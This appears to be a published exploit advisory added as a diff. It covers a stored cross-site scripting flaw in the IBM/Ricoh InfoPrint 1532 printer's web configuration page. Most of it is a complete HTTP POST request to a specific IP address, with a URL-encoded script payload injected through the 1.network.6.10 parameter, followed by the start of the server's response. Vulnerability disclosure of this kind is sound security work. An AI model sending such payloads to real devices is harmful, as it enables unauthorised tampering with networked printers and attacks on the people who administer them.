@@ -1,0 +1,35 @@
+# Exploit Title: IBM RICOH Infoprint 1532 Printer - Persistent Cross-Site Scripting
+# Date: 2020-01-02 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ibm.com/il-en
+# Hardware Link: https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?infotype=AN&subtype=CA&htmlfid=897/ENUS105-476&appname=USN
+# Vulernability Type: Cross-site Scripting
+# Vulenrability: Stored XSS
+# CVE: N/A
+
+# Description :
+# Ricoh (IBM) InfoPrint 1532 devices allow Stored XSS via the 1.network.6.10 parameter to the
+# cgi-bin/posttest/cgi-bin/dynamic/config/gen/general.html URI. (HTML Injection can also occur.)
+
+HTTP Request :
+
+POST /cgi-bin/posttest/cgi-bin/dynamic/config/gen/general.html HTTP/1.1
+Host: 134.84.35.70
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 281
+Origin: https://134.84.35.70
+Connection: close
+Referer: https://134.84.35.70/cgi-bin/dynamic/config/gen/general.html
+Upgrade-Insecure-Requests: 1
+
+0.printer.1.14=0&0.mfp.1.2=0&0.mfp.1.3=0&0.mfp.1.1=30&0.mfp.100.11=30&0.printer.4.258=1&1.network.6.10=%22%3E%3Cscript%3Ealert%28%22ismailtasdelen%22%29%3C%2Fscript%3E&1.network.6.11=&0.network.6.4=90&1.network.6.69=000000000000&2.network.6.63=0&0.network.10.73=120&1.printer.1.40=
+
+HTTP Response :
+
+HTTP/1.0 200 OK
+Content-Type: text/html
+Content-Length: 269
